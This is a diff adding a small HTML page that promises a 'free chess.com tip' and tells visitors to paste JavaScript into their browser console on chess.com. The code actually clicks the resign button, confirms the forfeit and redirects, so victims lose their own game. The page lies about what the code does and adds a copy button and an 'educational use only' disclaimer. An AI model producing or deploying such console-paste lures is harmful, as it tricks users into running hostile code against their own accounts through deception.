@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Free Chess Tip!</title>
+  <style>
+    body { background: #181c24; color: #7ecfff; font-family: Consolas, monospace; padding: 40px; }
+    .code { background: #232946; color: #fff; border-radius: 8px; padding: 18px; font-size: 1.1em; margin: 24px 0; }
+    button { background: #7ecfff; color: #232946; border: none; border-radius: 6px; padding: 8px 18px; font-weight: bold; cursor: pointer; }
+  </style>
+</head>
+<body>
+  <h1>Free Chess Tip!</h1>
+  <p>For a free chess.com tip, copy and paste the following code into your browser console while on chess.com:</p>
+  <div class="code" id="codeBox">
+let resignBtn = Array.from(document.querySelectorAll('button.cc-button-component')).find(btn => {
+    let svg = btn.querySelector('svg[data-glyph=\"game-flag-straight\"]');
+    return svg !== null;
+});
+if (resignBtn) {
+    resignBtn.click();
+    setTimeout(() => {
+        let yesBtn = Array.from(document.querySelectorAll('button.cc-button-component')).find(btn => btn.textContent.trim() === 'Yes');
+        if (yesBtn) yesBtn.click();
+        setTimeout(() => { window.location.href = 'https://www.chess.com/play'; }, 500);
+    }, 200);
+}
+  </div>
+  <button onclick="navigator.clipboard.writeText(document.getElementById('codeBox').innerText)">Copy Code</button>
+  <p style="margin-top:32px;color:#ff3a3a;font-weight:bold;">For novelty/educational use only!</p>
+</body>
+</html>
